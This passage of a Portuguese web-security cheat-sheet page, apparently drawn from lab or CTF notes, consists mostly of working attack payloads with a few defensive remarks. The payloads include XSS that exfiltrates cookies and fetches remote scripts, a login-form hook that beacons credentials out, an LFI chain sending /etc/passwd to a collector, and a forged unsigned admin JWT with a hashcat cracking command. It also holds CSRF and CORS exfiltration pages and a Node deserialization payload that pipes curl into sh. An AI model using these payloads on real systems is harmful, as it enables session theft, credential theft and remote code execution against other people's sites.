+<pre><code class="language-jsx">i&lt;img src=x onerror=fetch('http://127.0.0.1:8000/'+ document.cookie);&gt;
+</code></pre>
+<ul>
+<li>Executar codigo javascript a partir de um arquivo:</li>
+</ul>
+<pre><code class="language-jsx">&lt;img src=x onerror="var script1=document.createElement('script');script1.src='http://127.0.0.1:8000/payload.js';document.head.appendChild(script1);"/&gt;
+</code></pre>
+<pre><code class="language-html">&lt;iframe src="https://app.exemplo.test/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
+</code></pre>
+<ul>
+<li>HTML-encoded bypass</li>
+</ul>
+<pre><code class="language-bash">"onmouseover="alert(1)
+
+#href parameter
+javascript:alert(1)
+</code></pre>
+<ul>
+<li>Reflected XSS into a JavaScript string with angle brackets HTML encoded</li>
+</ul>
+<pre><code class="language-bash">'-alert(1)-'
+</code></pre>
+<ul>
+<li>Get credentials</li>
+</ul>
+<pre><code class="language-bash">document.addEventListener('DOMContentLoaded', function () {
+    const form = document.querySelector('.login-form');
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+        const u = document.querySelector('#username').value;
+        const p = document.querySelector('#password').value;
+        navigator.sendBeacon('http://127.0.0.1:8000/', new URLSearchParams({ u, p }));
+    });
+});
+</code></pre>
+</div></details><details class="source-note" open=""><summary>Markdown e leitura de arquivo</summary><div class="source-note-body"><ul>
+<li>LFI with markdown xss example:</li>
+</ul>
+<pre><code class="language-jsx">&lt;script&gt;
+fetch("http://vulnerable-site/view.php?file=../../../../etc/passwd")
+.then(response =&gt; response.text())
+.then(data =&gt; {
+fetch("http://127.0.0.1:8000/?file_content=" + encodeURIComponent(data));
+});
+&lt;/script&gt;
+</code></pre>
+</div></details></section><section class="guide-section" id="sessao"><span class="guide-label">TIPS / TRICKS</span><h2>08 / JWT, CSRF e CORS</h2><h3>JWT</h3><p>Se o servidor aceitar um JWT com <code>alg: none</code>, um token sem assinatura pode passar pela verificação. O ponto final continua presente para representar a assinatura vazia. Valide também emissor, audiência e expiração.</p><p>Para avaliar segredos JWT fracos em laboratório, o Hashcat usa o modo <code>16500</code>. Segredos de alta entropia e rotação controlada reduzem o risco.</p><h3>CSRF</h3><p>Em CSRF, tente reproduzir a ação a partir de outra origem. Verifique token anti-CSRF, cookies SameSite e confirmação para ações sensíveis.</p><h3>CORS</h3><p>Em CORS, confira se a origem é refletida e se <code>null</code> é aceito. Com credenciais liberadas, uma origem não confiável pode ler respostas sensíveis.</p><details class="source-note" open=""><summary>JWT com alg: none</summary><div class="source-note-body"><p>para explorar essa vulnerabilidade, precisamos mudar o paramentro “alg” para none.</p>
+<p>lembre-se tbm de remover a assinatura do token.</p>
+<p>token com “alg: none” mas ainda com a assinatura:</p>
+<pre><code class="language-bash">eyJraWQiOiJkMzFhNWVjYy00YTcwLTQ1NTAtYTNkZC1jZDRlNTBjOTc5MzciLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzAwNTcxNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.j1z5PNj4UeduLuIWOpep2FtGsXrH9yNxXkioeXf3CrTHRwCYHhKKgQb88PVfWcJ7b5hVbnODWioFr346eOGZDZukg2CHYNe0VwDfjdfd4VNo9w3oDl0xICptGYSlpZvSdOp1A4raT-5iwvRTDp5-xdhfHSBdU5StqYqwt9uJCiHYbWksmW5k6UgyPF_pG62Y_AqyZ5YXhO40hzHg6azcBgBDXq73ES7qGyLHRzG7YU3Y78xl1k6uDlfkcjW-I5VMjJBhGKBvmsUfo4w6ZXkW_0CjuzZ2cxA9cxGAAcPl1k2EWR1UaXoPKavc_wkPBOWAS2GQZw9ng446YKg3idX6gA
+</code></pre>
+<p>token pronto para o bypass: (alg : none e sem a assinatura):</p>
+<pre><code class="language-bash">eyJraWQiOiJkMzFhNWVjYy00YTcwLTQ1NTAtYTNkZC1jZDRlNTBjOTc5MzciLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzAwNTcxNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+</code></pre>
+<p>mesmo o algoritimo sendo definido como none. precisa do  ponto “.” no final do token.</p>
+</div></details><details class="source-note" open=""><summary>Hashcat para segredo JWT</summary><div class="source-note-body"><ul>
+<li>hashcat</li>
+</ul>
+<pre><code class="language-bash">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
+</code></pre>
+</div></details><details class="source-note" open=""><summary>Formulário de teste</summary><div class="source-note-body"><ul>
+<li>common code</li>
+</ul>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;form action="https://app.exemplo.test/email/change" method="POST"&gt;
+            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
+        &lt;/form&gt;
+        &lt;script&gt;
+            document.forms[0].submit();
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</div></details><details class="source-note" open=""><summary>Origem refletida e origem null</summary><div class="source-note-body"><p>CORS vulnerability with basic origin reflection</p>
+<pre><code class="language-html">        &lt;script&gt;
+            var xhr = new XMLHttpRequest();
+            var url = "https://app.exemplo.test"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        &lt;/script&gt;
+</code></pre>
+<ul>
+<li>cors null origin</li>
+</ul>
+<pre><code class="language-bash">&lt;html&gt;
+    &lt;body&gt;
+        &lt;iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        &lt;script&gt;
+            var xhr = new XMLHttpRequest();
+            var url = 'https://app.exemplo.test'
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + '/accountDetails', true);
+            xhr.withCredentials = true;
+            xhr.send(null);
+        &lt;/script&gt;"&gt;&lt;/iframe&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</div></details></section><section class="guide-section" id="outros"><span class="guide-label">TIPS / TRICKS</span><h2>09 / Outras superfícies web</h2><ul><li><strong>File Upload:</strong> validar tipo real, extensão, armazenamento e execução no servidor.</li><li><strong>Path Traversal:</strong> investigar normalização de caminhos e acesso fora do diretório esperado.</li><li><strong>HTTP Request Smuggling:</strong> divergência de parsing entre proxy e servidor.</li><li><strong>Insecure Deserialization:</strong> objetos não confiáveis recriados com efeitos inesperados.</li><li><strong>Prototype Pollution:</strong> chaves controladas que alteram protótipos JavaScript.</li><li><strong>Race Conditions:</strong> operações concorrentes que quebram invariantes de negócio.</li><li><strong>Remote Code Execution:</strong> impacto de uma falha, não uma categoria única de entrada.</li></ul><p>Use estes itens como checklist de triagem. Para cada tecnologia, identifique primeiro o ponto de entrada, a transformação da entrada e o impacto observável.</p><details class="source-note" open=""><summary>Leitura e execução em Node.js</summary><div class="source-note-body"><p>Read file</p>
+<pre><code class="language-jsx">require('fs').readFileSync('./flag.txt').toString();
+</code></pre>
+<p>Execute command</p>
+<pre><code class="language-python">_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://127.0.0.1:8000/shell.sh | sh').toString();
 </code></pre>
 </div></details></section><div class="guide-links"><a href="guia.html">← ÍNDICE DO GUIA</a><a href="guia-enumeracao.html">Enumeração ↗</a><a href="guia-credenciais.html">Credenciais ↗</a><a href="guia-servicos.html">Serviços &amp; Shell ↗</a><a href="guia-osint.html">OSINT ↗</a><a href="guia-satelites.html">Segurança de satélites ↗</a></div></article></div></main><footer class="site-footer"><a class="wordmark" href="index.html">s6msx<span class="spark">✦</span></a><span class="mono">CURIOUS BY NATURE. SECURE BY DESIGN.</span><a class="mono" href="#topo">BACK TO TOP ↑</a></footer><script src="script.js"></script></body></html>
